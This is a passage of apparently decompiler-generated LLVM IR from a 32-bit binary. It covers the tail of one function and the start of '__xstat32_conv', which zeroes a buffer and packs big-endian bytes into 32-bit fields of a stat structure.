  %v3_1bc98 = load i8, i8* %v2_1bc98, align 1
  %v4_1bc98 = zext i8 %v3_1bc98 to i32
  %v3_1bc9c = mul nuw nsw i32 %v4_1bc84, 65536
  store i32 %v3_1bc9c, i32* %r3.global-to-local, align 4
  %v3_1bca0 = mul nuw nsw i32 %v4_1bc88, 65536
  %v1_1bca4 = add i32 %v0_1bc84, 63
  %v2_1bca4 = inttoptr i32 %v1_1bca4 to i8*
  %v3_1bca4 = load i8, i8* %v2_1bca4, align 1
  %v4_1bca4 = zext i8 %v3_1bca4 to i32
  store i32 %v4_1bca4, i32* %r0.global-to-local, align 4
  %v4_1bca8 = mul nuw i32 %v4_1bc8c, 16777216
  %v5_1bca8 = or i32 %v4_1bca8, %v3_1bc9c
  store i32 %v5_1bca8, i32* %r3.global-to-local, align 4
  %v4_1bcac = mul nuw i32 %v4_1bc90, 16777216
  %v5_1bcac = or i32 %v4_1bcac, %v3_1bca0
  %v1_1bcb0 = add i32 %v0_1bc84, 59
  %v2_1bcb0 = inttoptr i32 %v1_1bcb0 to i8*
  %v3_1bcb0 = load i8, i8* %v2_1bcb0, align 1
  %v4_1bcb0 = zext i8 %v3_1bcb0 to i32
  %v4_1bcb4 = mul nuw nsw i32 %v4_1bc94, 256
  %v5_1bcb4 = or i32 %v4_1bcb4, %v5_1bca8
  %v4_1bcb8 = mul nuw nsw i32 %v4_1bc98, 256
  %v5_1bcb8 = or i32 %v4_1bcb8, %v5_1bcac
  %v2_1bcbc = or i32 %v5_1bcb4, %v4_1bca4
  store i32 %v2_1bcbc, i32* %r0.global-to-local, align 4
  %v2_1bcc0 = or i32 %v5_1bcb8, %v4_1bcb0
  store i32 %v2_1bcc0, i32* %r1.global-to-local, align 4
  store i32 %v2_1bcbc, i32* %r3.global-to-local, align 4
  %v1_1bcd0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bcd0 = add i32 %v1_1bcd0, 56
  %v3_1bcd0 = inttoptr i32 %v2_1bcd0 to i32*
  store i32 %v2_1bcc0, i32* %v3_1bcd0, align 4
  %v0_1bcd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bcd4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bcd4 = add i32 %v1_1bcd4, 60
  %v3_1bcd4 = inttoptr i32 %v2_1bcd4 to i32*
  store i32 %v0_1bcd4, i32* %v3_1bcd4, align 4
  %v0_1bcd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bcd8 = add i32 %v0_1bcd8, 65
  %v2_1bcd8 = inttoptr i32 %v1_1bcd8 to i8*
  %v3_1bcd8 = load i8, i8* %v2_1bcd8, align 1
  %v4_1bcd8 = zext i8 %v3_1bcd8 to i32
  store i32 %v4_1bcd8, i32* %r3.global-to-local, align 4
  %v1_1bcdc = add i32 %v0_1bcd8, 69
  %v2_1bcdc = inttoptr i32 %v1_1bcdc to i8*
  %v3_1bcdc = load i8, i8* %v2_1bcdc, align 1
  %v4_1bcdc = zext i8 %v3_1bcdc to i32
  %v1_1bce0 = add i32 %v0_1bcd8, 64
  %v2_1bce0 = inttoptr i32 %v1_1bce0 to i8*
  %v3_1bce0 = load i8, i8* %v2_1bce0, align 1
  %v4_1bce0 = zext i8 %v3_1bce0 to i32
  store i32 %v4_1bce0, i32* %r1.global-to-local, align 4
  %v1_1bce4 = add i32 %v0_1bcd8, 68
  %v2_1bce4 = inttoptr i32 %v1_1bce4 to i8*
  %v3_1bce4 = load i8, i8* %v2_1bce4, align 1
  %v4_1bce4 = zext i8 %v3_1bce4 to i32
  store i32 %v4_1bce4, i32* %r0.global-to-local, align 4
  %v1_1bce8 = add i32 %v0_1bcd8, 66
  %v2_1bce8 = inttoptr i32 %v1_1bce8 to i8*
  %v3_1bce8 = load i8, i8* %v2_1bce8, align 1
  %v4_1bce8 = zext i8 %v3_1bce8 to i32
  %v1_1bcec = add i32 %v0_1bcd8, 70
  %v2_1bcec = inttoptr i32 %v1_1bcec to i8*
  %v3_1bcec = load i8, i8* %v2_1bcec, align 1
  %v4_1bcec = zext i8 %v3_1bcec to i32
  %v3_1bcf0 = mul nuw nsw i32 %v4_1bcd8, 65536
  %v3_1bcf4 = mul nuw nsw i32 %v4_1bcdc, 65536
  %v4_1bcf8 = mul nuw i32 %v4_1bce0, 16777216
  %v5_1bcf8 = or i32 %v4_1bcf8, %v3_1bcf0
  store i32 %v5_1bcf8, i32* %r3.global-to-local, align 4
  %v4_1bcfc = mul nuw i32 %v4_1bce4, 16777216
  %v5_1bcfc = or i32 %v4_1bcfc, %v3_1bcf4
  %v1_1bd00 = add i32 %v0_1bcd8, 71
  %v2_1bd00 = inttoptr i32 %v1_1bd00 to i8*
  %v3_1bd00 = load i8, i8* %v2_1bd00, align 1
  %v4_1bd00 = zext i8 %v3_1bd00 to i32
  store i32 %v4_1bd00, i32* %r1.global-to-local, align 4
  %v1_1bd04 = add i32 %v0_1bcd8, 67
  %v2_1bd04 = inttoptr i32 %v1_1bd04 to i8*
  %v3_1bd04 = load i8, i8* %v2_1bd04, align 1
  %v4_1bd04 = zext i8 %v3_1bd04 to i32
  %v4_1bd08 = mul nuw nsw i32 %v4_1bce8, 256
  %v5_1bd08 = or i32 %v4_1bd08, %v5_1bcf8
  store i32 %v5_1bd08, i32* %r3.global-to-local, align 4
  %v4_1bd0c = mul nuw nsw i32 %v4_1bcec, 256
  %v5_1bd0c = or i32 %v4_1bd0c, %v5_1bcfc
  %v2_1bd10 = or i32 %v4_1bd04, %v5_1bd08
  store i32 %v2_1bd10, i32* %r0.global-to-local, align 4
  %v2_1bd14 = or i32 %v4_1bd00, %v5_1bd0c
  store i32 %v2_1bd14, i32* %r1.global-to-local, align 4
  %v1_1bd18 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bd18 = add i32 %v1_1bd18, 68
  %v3_1bd18 = inttoptr i32 %v2_1bd18 to i32*
  store i32 %v2_1bd14, i32* %v3_1bd18, align 4
  %v0_1bd1c = load i32, i32* %r0.global-to-local, align 4
  %v1_1bd1c = load i32, i32* %r8.global-to-local, align 4
  %v2_1bd1c = add i32 %v1_1bd1c, 64
  %v3_1bd1c = inttoptr i32 %v2_1bd1c to i32*
  store i32 %v0_1bd1c, i32* %v3_1bd1c, align 4
  %v0_1bd20 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bd20 = add i32 %v0_1bd20, 73
  %v2_1bd20 = inttoptr i32 %v1_1bd20 to i8*
  %v3_1bd20 = load i8, i8* %v2_1bd20, align 1
  %v4_1bd20 = zext i8 %v3_1bd20 to i32
  store i32 %v4_1bd20, i32* %r3.global-to-local, align 4
  %v1_1bd24 = add i32 %v0_1bd20, 77
  %v2_1bd24 = inttoptr i32 %v1_1bd24 to i8*
  %v3_1bd24 = load i8, i8* %v2_1bd24, align 1
  %v4_1bd24 = zext i8 %v3_1bd24 to i32
  %v1_1bd28 = add i32 %v0_1bd20, 72
  %v2_1bd28 = inttoptr i32 %v1_1bd28 to i8*
  %v3_1bd28 = load i8, i8* %v2_1bd28, align 1
  %v4_1bd28 = zext i8 %v3_1bd28 to i32
  store i32 %v4_1bd28, i32* %r1.global-to-local, align 4
  %v1_1bd2c = add i32 %v0_1bd20, 76
  %v2_1bd2c = inttoptr i32 %v1_1bd2c to i8*
  %v3_1bd2c = load i8, i8* %v2_1bd2c, align 1
  %v4_1bd2c = zext i8 %v3_1bd2c to i32
  store i32 %v4_1bd2c, i32* %r0.global-to-local, align 4
  %v1_1bd30 = add i32 %v0_1bd20, 74
  %v2_1bd30 = inttoptr i32 %v1_1bd30 to i8*
  %v3_1bd30 = load i8, i8* %v2_1bd30, align 1
  %v4_1bd30 = zext i8 %v3_1bd30 to i32
  %v1_1bd34 = add i32 %v0_1bd20, 78
  %v2_1bd34 = inttoptr i32 %v1_1bd34 to i8*
  %v3_1bd34 = load i8, i8* %v2_1bd34, align 1
  %v4_1bd34 = zext i8 %v3_1bd34 to i32
  %v3_1bd38 = mul nuw nsw i32 %v4_1bd20, 65536
  %v3_1bd3c = mul nuw nsw i32 %v4_1bd24, 65536
  %v4_1bd40 = mul nuw i32 %v4_1bd28, 16777216
  %v5_1bd40 = or i32 %v4_1bd40, %v3_1bd38
  store i32 %v5_1bd40, i32* %r3.global-to-local, align 4
  %v4_1bd44 = mul nuw i32 %v4_1bd2c, 16777216
  %v5_1bd44 = or i32 %v4_1bd44, %v3_1bd3c
  %v1_1bd48 = add i32 %v0_1bd20, 79
  %v2_1bd48 = inttoptr i32 %v1_1bd48 to i8*
  %v3_1bd48 = load i8, i8* %v2_1bd48, align 1
  %v4_1bd48 = zext i8 %v3_1bd48 to i32
  store i32 %v4_1bd48, i32* %r1.global-to-local, align 4
  %v1_1bd4c = add i32 %v0_1bd20, 75
  %v2_1bd4c = inttoptr i32 %v1_1bd4c to i8*
  %v3_1bd4c = load i8, i8* %v2_1bd4c, align 1
  %v4_1bd4c = zext i8 %v3_1bd4c to i32
  %v4_1bd50 = mul nuw nsw i32 %v4_1bd30, 256
  %v5_1bd50 = or i32 %v4_1bd50, %v5_1bd40
  store i32 %v5_1bd50, i32* %r3.global-to-local, align 4
  %v4_1bd54 = mul nuw nsw i32 %v4_1bd34, 256
  %v5_1bd54 = or i32 %v4_1bd54, %v5_1bd44
  %v2_1bd58 = or i32 %v4_1bd4c, %v5_1bd50
  store i32 %v2_1bd58, i32* %r0.global-to-local, align 4
  %v2_1bd5c = or i32 %v4_1bd48, %v5_1bd54
  store i32 %v2_1bd5c, i32* %r1.global-to-local, align 4
  %v1_1bd60 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bd60 = add i32 %v1_1bd60, 76
  %v3_1bd60 = inttoptr i32 %v2_1bd60 to i32*
  store i32 %v2_1bd5c, i32* %v3_1bd60, align 4
  %v0_1bd64 = load i32, i32* %r0.global-to-local, align 4
  %v1_1bd64 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bd64 = add i32 %v1_1bd64, 72
  %v3_1bd64 = inttoptr i32 %v2_1bd64 to i32*
  store i32 %v0_1bd64, i32* %v3_1bd64, align 4
  %v0_1bd68 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bd68 = add i32 %v0_1bd68, 81
  %v2_1bd68 = inttoptr i32 %v1_1bd68 to i8*
  %v3_1bd68 = load i8, i8* %v2_1bd68, align 1
  %v4_1bd68 = zext i8 %v3_1bd68 to i32
  store i32 %v4_1bd68, i32* %r3.global-to-local, align 4
  %v1_1bd6c = add i32 %v0_1bd68, 85
  %v2_1bd6c = inttoptr i32 %v1_1bd6c to i8*
  %v3_1bd6c = load i8, i8* %v2_1bd6c, align 1
  %v4_1bd6c = zext i8 %v3_1bd6c to i32
  %v1_1bd70 = add i32 %v0_1bd68, 80
  %v2_1bd70 = inttoptr i32 %v1_1bd70 to i8*
  %v3_1bd70 = load i8, i8* %v2_1bd70, align 1
  %v4_1bd70 = zext i8 %v3_1bd70 to i32
  store i32 %v4_1bd70, i32* %r1.global-to-local, align 4
  %v1_1bd74 = add i32 %v0_1bd68, 84
  %v2_1bd74 = inttoptr i32 %v1_1bd74 to i8*
  %v3_1bd74 = load i8, i8* %v2_1bd74, align 1
  %v4_1bd74 = zext i8 %v3_1bd74 to i32
  store i32 %v4_1bd74, i32* %r0.global-to-local, align 4
  %v1_1bd78 = add i32 %v0_1bd68, 82
  %v2_1bd78 = inttoptr i32 %v1_1bd78 to i8*
  %v3_1bd78 = load i8, i8* %v2_1bd78, align 1
  %v4_1bd78 = zext i8 %v3_1bd78 to i32
  %v1_1bd7c = add i32 %v0_1bd68, 86
  %v2_1bd7c = inttoptr i32 %v1_1bd7c to i8*
  %v3_1bd7c = load i8, i8* %v2_1bd7c, align 1
  %v4_1bd7c = zext i8 %v3_1bd7c to i32
  %v3_1bd80 = mul nuw nsw i32 %v4_1bd68, 65536
  %v3_1bd84 = mul nuw nsw i32 %v4_1bd6c, 65536
  %v4_1bd88 = mul nuw i32 %v4_1bd70, 16777216
  %v5_1bd88 = or i32 %v4_1bd88, %v3_1bd80
  store i32 %v5_1bd88, i32* %r3.global-to-local, align 4
  %v4_1bd8c = mul nuw i32 %v4_1bd74, 16777216
  %v5_1bd8c = or i32 %v4_1bd8c, %v3_1bd84
  %v1_1bd90 = add i32 %v0_1bd68, 83
  %v2_1bd90 = inttoptr i32 %v1_1bd90 to i8*
  %v3_1bd90 = load i8, i8* %v2_1bd90, align 1
  %v4_1bd90 = zext i8 %v3_1bd90 to i32
  store i32 %v4_1bd90, i32* %r1.global-to-local, align 4
  %v1_1bd94 = add i32 %v0_1bd68, 87
  %v2_1bd94 = inttoptr i32 %v1_1bd94 to i8*
  %v3_1bd94 = load i8, i8* %v2_1bd94, align 1
  %v4_1bd94 = zext i8 %v3_1bd94 to i32
  %v4_1bd98 = mul nuw nsw i32 %v4_1bd78, 256
  %v5_1bd98 = or i32 %v4_1bd98, %v5_1bd88
  store i32 %v5_1bd98, i32* %r3.global-to-local, align 4
  %v4_1bd9c = mul nuw nsw i32 %v4_1bd7c, 256
  %v5_1bd9c = or i32 %v4_1bd9c, %v5_1bd8c
  %v2_1bda0 = or i32 %v4_1bd90, %v5_1bd98
  store i32 %v2_1bda0, i32* %r1.global-to-local, align 4
  %v2_1bda4 = or i32 %v4_1bd94, %v5_1bd9c
  store i32 %v2_1bda4, i32* %r0.global-to-local, align 4
  %v1_1bda8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bda8 = add i32 %v1_1bda8, 80
  %v3_1bda8 = inttoptr i32 %v2_1bda8 to i32*
  store i32 %v2_1bda0, i32* %v3_1bda8, align 4
  %v1_1bdac = load i32, i32* %r8.global-to-local, align 4
  %v2_1bdac = add i32 %v1_1bdac, 84
  %v3_1bdac = inttoptr i32 %v2_1bdac to i32*
  store i32 %v2_1bda4, i32* %v3_1bdac, align 4
  ret i32 %v2_1bda4

; uselistorder directives
  uselistorder i32 %v0_1bd68, { 1, 0, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_1bd20, { 1, 0, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_1bcd8, { 1, 0, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v3_1bc9c, { 1, 0 }
  uselistorder i32 %v0_1bc84, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v3_1bc20, { 1, 0 }
  uselistorder i32 %v0_1bc08, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v3_1bbc8, { 1, 0 }
  uselistorder i32 %v0_1bbb0, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v3_1bacc, { 1, 0 }
  uselistorder i32 %v0_1bab4, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v3_1ba88, { 1, 0 }
  uselistorder i32 %v0_1ba70, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 10, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 0 }
  uselistorder i32 96, { 1, 3, 4, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
}

define i32 @__xstat32_conv(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_1bdd4 = inttoptr i32 %arg2 to i8*
  %v3_1bdd4 = call i32 @__GI_memset(i8* %v2_1bdd4, i32 0)
  store i32 %v3_1bdd4, i32* %r0.global-to-local, align 4
  %v0_1bdd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bdd8 = add i32 %v0_1bdd8, 5
  %v2_1bdd8 = inttoptr i32 %v1_1bdd8 to i8*
  %v3_1bdd8 = load i8, i8* %v2_1bdd8, align 1
  %v4_1bdd8 = zext i8 %v3_1bdd8 to i32
  store i32 %v4_1bdd8, i32* %r3.global-to-local, align 4
  %v1_1bddc = add i32 %v0_1bdd8, 1
  %v2_1bddc = inttoptr i32 %v1_1bddc to i8*
  %v3_1bddc = load i8, i8* %v2_1bddc, align 1
  %v4_1bddc = zext i8 %v3_1bddc to i32
  %v1_1bde0 = add i32 %v0_1bdd8, 4
  %v2_1bde0 = inttoptr i32 %v1_1bde0 to i8*
  %v3_1bde0 = load i8, i8* %v2_1bde0, align 1
  %v4_1bde0 = zext i8 %v3_1bde0 to i32
  %v1_1bde4 = inttoptr i32 %v0_1bdd8 to i8*
  %v2_1bde4 = load i8, i8* %v1_1bde4, align 1
  %v3_1bde4 = zext i8 %v2_1bde4 to i32
  %v1_1bde8 = add i32 %v0_1bdd8, 2
  %v2_1bde8 = inttoptr i32 %v1_1bde8 to i8*
  %v3_1bde8 = load i8, i8* %v2_1bde8, align 1
  %v4_1bde8 = zext i8 %v3_1bde8 to i32
  %v1_1bdec = add i32 %v0_1bdd8, 6
  %v2_1bdec = inttoptr i32 %v1_1bdec to i8*
  %v3_1bdec = load i8, i8* %v2_1bdec, align 1
  %v4_1bdec = zext i8 %v3_1bdec to i32
  %v3_1bdf0 = mul nuw nsw i32 %v4_1bdd8, 65536
  store i32 %v3_1bdf0, i32* %r3.global-to-local, align 4
  %v3_1bdf4 = mul nuw nsw i32 %v4_1bddc, 65536
  %v1_1bdf8 = add i32 %v0_1bdd8, 7
  %v2_1bdf8 = inttoptr i32 %v1_1bdf8 to i8*
  %v3_1bdf8 = load i8, i8* %v2_1bdf8, align 1
  %v4_1bdf8 = zext i8 %v3_1bdf8 to i32
  %v4_1bdfc = mul nuw i32 %v4_1bde0, 16777216
  %v5_1bdfc = or i32 %v4_1bdfc, %v3_1bdf0
  store i32 %v5_1bdfc, i32* %r3.global-to-local, align 4
  %v4_1be00 = mul nuw i32 %v3_1bde4, 16777216
  %v5_1be00 = or i32 %v4_1be00, %v3_1bdf4
  %v1_1be04 = add i32 %v0_1bdd8, 3
  %v2_1be04 = inttoptr i32 %v1_1be04 to i8*
  %v3_1be04 = load i8, i8* %v2_1be04, align 1
  %v4_1be04 = zext i8 %v3_1be04 to i32
  %v4_1be08 = mul nuw nsw i32 %v4_1bde8, 256
  %v5_1be08 = or i32 %v4_1be08, %v5_1be00
  %v4_1be0c = mul nuw nsw i32 %v4_1bdec, 256
  %v5_1be0c = or i32 %v4_1be0c, %v5_1bdfc
  store i32 %v5_1be0c, i32* %r3.global-to-local, align 4
  %v2_1be10 = or i32 %v4_1bdf8, %v5_1be0c
  store i32 %v2_1be10, i32* %r1.global-to-local, align 4
  %v2_1be14 = or i32 %v4_1be04, %v5_1be08
  store i32 %v2_1be14, i32* %r0.global-to-local, align 4
  %v0_1be18 = load i32, i32* %r8.global-to-local, align 4
  %v1_1be18 = inttoptr i32 %v0_1be18 to i32*
  store i32 %v2_1be14, i32* %v1_1be18, align 4
  %v3_1be18 = add i32 %v0_1be18, 4
  %v4_1be18 = inttoptr i32 %v3_1be18 to i32*
  %v5_1be18 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1be18, i32* %v4_1be18, align 4
  %v0_1be1c = load i32, i32* %r4.global-to-local, align 4
  %v1_1be1c = add i32 %v0_1be1c, 93
  %v2_1be1c = inttoptr i32 %v1_1be1c to i8*
  %v3_1be1c = load i8, i8* %v2_1be1c, align 1
  %v4_1be1c = zext i8 %v3_1be1c to i32
  store i32 %v4_1be1c, i32* %r3.global-to-local, align 4
  %v1_1be20 = add i32 %v0_1be1c, 92
  %v2_1be20 = inttoptr i32 %v1_1be20 to i8*
  %v3_1be20 = load i8, i8* %v2_1be20, align 1
  %v4_1be20 = zext i8 %v3_1be20 to i32
  store i32 %v4_1be20, i32* %r1.global-to-local, align 4
  %v1_1be24 = add i32 %v0_1be1c, 94
  %v2_1be24 = inttoptr i32 %v1_1be24 to i8*
  %v3_1be24 = load i8, i8* %v2_1be24, align 1
  %v4_1be24 = zext i8 %v3_1be24 to i32
  %v3_1be28 = mul nuw nsw i32 %v4_1be1c, 65536
  store i32 %v3_1be28, i32* %r3.global-to-local, align 4
  %v1_1be2c = add i32 %v0_1be1c, 95
  %v2_1be2c = inttoptr i32 %v1_1be2c to i8*
  %v3_1be2c = load i8, i8* %v2_1be2c, align 1
  %v4_1be2c = zext i8 %v3_1be2c to i32
  store i32 %v4_1be2c, i32* %r0.global-to-local, align 4
  %v4_1be30 = mul nuw i32 %v4_1be20, 16777216
  %v5_1be30 = or i32 %v4_1be30, %v3_1be28
  %v4_1be34 = mul nuw nsw i32 %v4_1be24, 256
  %v5_1be34 = or i32 %v5_1be30, %v4_1be34
  store i32 %v5_1be34, i32* %r3.global-to-local, align 4
  %v2_1be38 = or i32 %v4_1be2c, %v5_1be34
  %v1_1be40 = load i32, i32* %r8.global-to-local, align 4
  %v2_1be40 = add i32 %v1_1be40, 12
  %v3_1be40 = inttoptr i32 %v2_1be40 to i32*
  store i32 %v2_1be38, i32* %v3_1be40, align 4
  %v0_1be44 = load i32, i32* %r4.global-to-local, align 4
  %v1_1be44 = add i32 %v0_1be44, 17
  %v2_1be44 = inttoptr i32 %v1_1be44 to i8*
  %v3_1be44 = load i8, i8* %v2_1be44, align 1
  %v4_1be44 = zext i8 %v3_1be44 to i32
  store i32 %v4_1be44, i32* %r3.global-to-local, align 4
  %v1_1be48 = add i32 %v0_1be44, 16
  %v2_1be48 = inttoptr i32 %v1_1be48 to i8*
  %v3_1be48 = load i8, i8* %v2_1be48, align 1
  %v4_1be48 = zext i8 %v3_1be48 to i32
  %v1_1be4c = add i32 %v0_1be44, 18
  %v2_1be4c = inttoptr i32 %v1_1be4c to i8*
  %v3_1be4c = load i8, i8* %v2_1be4c, align 1
  %v4_1be4c = zext i8 %v3_1be4c to i32
  store i32 %v4_1be4c, i32* %r1.global-to-local, align 4
  %v3_1be50 = mul nuw nsw i32 %v4_1be44, 65536
  %v4_1be54 = mul nuw i32 %v4_1be48, 16777216
  %v5_1be54 = or i32 %v4_1be54, %v3_1be50
  store i32 %v5_1be54, i32* %r3.global-to-local, align 4
  %v1_1be58 = add i32 %v0_1be44, 19
  %v2_1be58 = inttoptr i32 %v1_1be58 to i8*
  %v3_1be58 = load i8, i8* %v2_1be58, align 1
  %v4_1be58 = zext i8 %v3_1be58 to i32
  %v4_1be5c = mul nuw nsw i32 %v4_1be4c, 256
  %v5_1be5c = or i32 %v4_1be5c, %v5_1be54
  store i32 %v5_1be5c, i32* %r3.global-to-local, align 4
  %v2_1be60 = or i32 %v4_1be58, %v5_1be5c
  %v1_1be64 = load i32, i32* %r8.global-to-local, align 4
  %v2_1be64 = add i32 %v1_1be64, 16
  %v3_1be64 = inttoptr i32 %v2_1be64 to i32*
  store i32 %v2_1be60, i32* %v3_1be64, align 4
  %v0_1be68 = load i32, i32* %r4.global-to-local, align 4
  %v1_1be68 = add i32 %v0_1be68, 21
  %v2_1be68 = inttoptr i32 %v1_1be68 to i8*
  %v3_1be68 = load i8, i8* %v2_1be68, align 1
  %v4_1be68 = zext i8 %v3_1be68 to i32
  store i32 %v4_1be68, i32* %r3.global-to-local, align 4
  %v1_1be6c = add i32 %v0_1be68, 20
  %v2_1be6c = inttoptr i32 %v1_1be6c to i8*
  %v3_1be6c = load i8, i8* %v2_1be6c, align 1
  %v4_1be6c = zext i8 %v3_1be6c to i32
  %v1_1be70 = add i32 %v0_1be68, 22
  %v2_1be70 = inttoptr i32 %v1_1be70 to i8*
  %v3_1be70 = load i8, i8* %v2_1be70, align 1
  %v4_1be70 = zext i8 %v3_1be70 to i32
  store i32 %v4_1be70, i32* %r1.global-to-local, align 4
  %v3_1be74 = mul nuw nsw i32 %v4_1be68, 65536
  %v4_1be78 = mul nuw i32 %v4_1be6c, 16777216
  %v5_1be78 = or i32 %v4_1be78, %v3_1be74
  store i32 %v5_1be78, i32* %r3.global-to-local, align 4
  %v1_1be7c = add i32 %v0_1be68, 23
  %v2_1be7c = inttoptr i32 %v1_1be7c to i8*
  %v3_1be7c = load i8, i8* %v2_1be7c, align 1
  %v4_1be7c = zext i8 %v3_1be7c to i32
  %v4_1be80 = mul nuw nsw i32 %v4_1be70, 256
  %v5_1be80 = or i32 %v4_1be80, %v5_1be78
  store i32 %v5_1be80, i32* %r3.global-to-local, align 4
  %v2_1be84 = or i32 %v4_1be7c, %v5_1be80
  %v1_1be88 = load i32, i32* %r8.global-to-local, align 4
  %v2_1be88 = add i32 %v1_1be88, 20
  %v3_1be88 = inttoptr i32 %v2_1be88 to i32*
  store i32 %v2_1be84, i32* %v3_1be88, align 4
  %v0_1be8c = load i32, i32* %r4.global-to-local, align 4
  %v1_1be8c = add i32 %v0_1be8c, 25
  %v2_1be8c = inttoptr i32 %v1_1be8c to i8*
  %v3_1be8c = load i8, i8* %v2_1be8c, align 1
  %v4_1be8c = zext i8 %v3_1be8c to i32
  store i32 %v4_1be8c, i32* %r3.global-to-local, align 4
  %v1_1be90 = add i32 %v0_1be8c, 24
  %v2_1be90 = inttoptr i32 %v1_1be90 to i8*
  %v3_1be90 = load i8, i8* %v2_1be90, align 1
  %v4_1be90 = zext i8 %v3_1be90 to i32
  %v1_1be94 = add i32 %v0_1be8c, 26
  %v2_1be94 = inttoptr i32 %v1_1be94 to i8*
  %v3_1be94 = load i8, i8* %v2_1be94, align 1
  %v4_1be94 = zext i8 %v3_1be94 to i32
  store i32 %v4_1be94, i32* %r1.global-to-local, align 4
  %v3_1be98 = mul nuw nsw i32 %v4_1be8c, 65536
  %v4_1be9c = mul nuw i32 %v4_1be90, 16777216
  %v5_1be9c = or i32 %v4_1be9c, %v3_1be98
  store i32 %v5_1be9c, i32* %r3.global-to-local, align 4
  %v1_1bea0 = add i32 %v0_1be8c, 27
  %v2_1bea0 = inttoptr i32 %v1_1bea0 to i8*
  %v3_1bea0 = load i8, i8* %v2_1bea0, align 1
  %v4_1bea0 = zext i8 %v3_1bea0 to i32
  %v4_1bea4 = mul nuw nsw i32 %v4_1be94, 256
  %v5_1bea4 = or i32 %v4_1bea4, %v5_1be9c
  store i32 %v5_1bea4, i32* %r3.global-to-local, align 4
  %v2_1bea8 = or i32 %v4_1bea0, %v5_1bea4
  %v1_1beac = load i32, i32* %r8.global-to-local, align 4
  %v2_1beac = add i32 %v1_1beac, 24
  %v3_1beac = inttoptr i32 %v2_1beac to i32*
  store i32 %v2_1bea8, i32* %v3_1beac, align 4
  %v0_1beb0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1beb0 = add i32 %v0_1beb0, 29
  %v2_1beb0 = inttoptr i32 %v1_1beb0 to i8*
  %v3_1beb0 = load i8, i8* %v2_1beb0, align 1
  %v4_1beb0 = zext i8 %v3_1beb0 to i32
  store i32 %v4_1beb0, i32* %r3.global-to-local, align 4
  %v1_1beb4 = add i32 %v0_1beb0, 28
  %v2_1beb4 = inttoptr i32 %v1_1beb4 to i8*
  %v3_1beb4 = load i8, i8* %v2_1beb4, align 1
  %v4_1beb4 = zext i8 %v3_1beb4 to i32
  %v1_1beb8 = add i32 %v0_1beb0, 30
  %v2_1beb8 = inttoptr i32 %v1_1beb8 to i8*
  %v3_1beb8 = load i8, i8* %v2_1beb8, align 1
  %v4_1beb8 = zext i8 %v3_1beb8 to i32
  store i32 %v4_1beb8, i32* %r1.global-to-local, align 4
  %v3_1bebc = mul nuw nsw i32 %v4_1beb0, 65536
  %v4_1bec0 = mul nuw i32 %v4_1beb4, 16777216
  %v5_1bec0 = or i32 %v4_1bec0, %v3_1bebc
  store i32 %v5_1bec0, i32* %r3.global-to-local, align 4
  %v1_1bec4 = add i32 %v0_1beb0, 31
  %v2_1bec4 = inttoptr i32 %v1_1bec4 to i8*
  %v3_1bec4 = load i8, i8* %v2_1bec4, align 1
  %v4_1bec4 = zext i8 %v3_1bec4 to i32
  %v4_1bec8 = mul nuw nsw i32 %v4_1beb8, 256
  %v5_1bec8 = or i32 %v4_1bec8, %v5_1bec0
  store i32 %v5_1bec8, i32* %r3.global-to-local, align 4
  %v2_1becc = or i32 %v4_1bec4, %v5_1bec8
  %v1_1bed0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bed0 = add i32 %v1_1bed0, 28
  %v3_1bed0 = inttoptr i32 %v2_1bed0 to i32*
  store i32 %v2_1becc, i32* %v3_1bed0, align 4
  %v0_1bed4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bed4 = add i32 %v0_1bed4, 37
  %v2_1bed4 = inttoptr i32 %v1_1bed4 to i8*
  %v3_1bed4 = load i8, i8* %v2_1bed4, align 1
  %v4_1bed4 = zext i8 %v3_1bed4 to i32
  store i32 %v4_1bed4, i32* %r3.global-to-local, align 4
  %v1_1bed8 = add i32 %v0_1bed4, 33
  %v2_1bed8 = inttoptr i32 %v1_1bed8 to i8*
  %v3_1bed8 = load i8, i8* %v2_1bed8, align 1
  %v4_1bed8 = zext i8 %v3_1bed8 to i32
  %v1_1bedc = add i32 %v0_1bed4, 36
  %v2_1bedc = inttoptr i32 %v1_1bedc to i8*
